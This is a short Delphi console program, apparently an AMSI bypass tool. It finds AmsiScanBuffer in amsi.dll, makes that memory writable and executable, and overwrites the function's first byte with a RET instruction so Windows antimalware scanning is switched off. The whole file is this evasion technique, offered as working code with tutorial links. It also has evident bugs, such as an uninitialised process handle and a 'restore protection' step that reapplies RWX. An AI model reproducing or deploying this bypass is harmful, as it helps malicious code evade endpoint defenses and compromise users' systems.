program BasedAmsi_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
}

uses
  System.SysUtils,
  Windows
  ;

var
  PidHandle: integer;
  PidID : integer;
  Written: UIntPtr;

  lib : THandle;
  asb : Pointer;
  NumWrote : SIZE_T;
  OldProtect : DWord;
  garbage : Byte = $C3;

type UIntPtr = NativeUInt;



begin
  try
  //Init needed
    //WriteLn(GetWindowThreadProcessId(h, PID));
    //Proc := OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, PID);
    //WriteLn(Proc);





  //Load and get base address for AmsScanBuffer
    lib := LoadLibrary('amsi.dll');
    asb := GetProcAddress(lib,'AmsiScanBuffer');
    WriteLn(Format('[+] amsi.dll base address: %p',[asb]));


  //Change memory protection to RWX
    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
    WriteLn('[+] RWX protected');


  //Write to memory @ pter
    WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
    WriteLn('[+] Written To amsi.dll');

  //Change memory protection to RWX
    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
    WriteLn('[+] RX protected');


  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.

